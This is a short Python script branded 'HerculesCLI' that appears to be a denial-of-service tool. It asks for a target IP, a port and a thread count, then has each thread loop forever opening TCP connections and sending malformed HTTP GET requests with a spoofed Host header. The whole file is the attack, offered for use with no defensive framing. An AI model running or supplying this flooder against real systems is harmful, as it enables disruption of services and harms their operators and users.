import os
from concurrent.futures import thread
import socket
import threading
os.system("clear")
os.system("toilet HerculesCLI")
print("© 2022 GUARDESK Security LTD.")
target = str(input("Insert Target IP: "))
port = int(input("Insert Port: "))
Trd = int(input("Insert Threads: "))
fake_ip = '44.197.175.168'
attack_num = 0
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target +"HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        global attack_num
        attack_num += 1
        print(attack_num)

        s.close()
for i in range(Trd):
    thread = threading.Thread(target = attack)
    thread.start()    
